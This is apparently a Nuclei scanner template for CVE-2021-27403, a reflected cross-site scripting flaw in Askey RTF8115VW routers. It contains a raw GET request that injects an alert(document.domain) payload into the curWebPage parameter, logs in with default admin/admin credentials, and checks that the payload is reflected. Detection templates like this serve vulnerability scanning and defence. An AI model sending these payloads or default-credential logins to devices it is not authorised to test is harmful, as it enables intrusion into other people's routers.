id: CVE-2021-27403

info:
  name: Askey RTF8115 - Cross Site Scripting
  author: edoardottt
  severity: medium
  description: |
    Askey RTF8115VW BR_SV_g11.11_RTF_TEF001_V6.54_V014 devices allow cgi-bin/te_acceso_router.cgi curWebPage XSS.
  reference:
    - https://github.com/bokanrb/CVE-2021-27403
    - https://nvd.nist.gov/vuln/detail/CVE-2021-27403
  classification:
    cve-id: CVE-2021-27403
  tags: cve,cve2021,xss,askey

requests:
  - raw:
      - |
        @timeout: 10s
        GET /cgi-bin/te_acceso_router.cgi?curWebPage=/settings-internet.asp";alert(document.domain)//&loginUsername=admin&loginPassword=admin HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: word
        part: header
        words:
          - "text/html"

      - type: word
        part: body
        words:
          - ";alert(document.domain)"